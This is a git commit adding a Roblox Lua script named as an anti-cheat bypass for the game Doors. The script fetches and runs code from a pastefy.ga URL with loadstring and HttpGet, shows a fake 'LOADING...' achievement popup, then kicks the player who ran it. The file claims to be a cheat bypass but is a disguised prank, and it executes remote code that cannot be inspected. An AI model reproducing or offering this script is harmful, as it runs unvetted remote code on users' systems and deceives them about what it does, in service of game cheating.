4874f9af291b1fd38d605a47c02f838c586e38a5
MrSPeeDy0 <132045787+MrSPeeDy0@users.noreply.github.com>
2023-05-19 22:07:55 +0800

    Add files via upload

---
+++ Door bypass anti-cheat.lua
@@ -0,0 +1,12 @@
+local Achievements = loadstring(game:HttpGet("https://pastefy.ga/5H71EDr1/raw"))()
+
+Achievements.Get({
+    Title = "Doors bypass anti-cheat",
+    Desc = "LOADING...",
+    Reason = 'Made by Ultra',
+    Image = "https://www.roblox.com/asset/?id=6023426923",
+})
+
+task.wait(8.5)
+
+game.Players.LocalPlayer:Kick("Bruh")
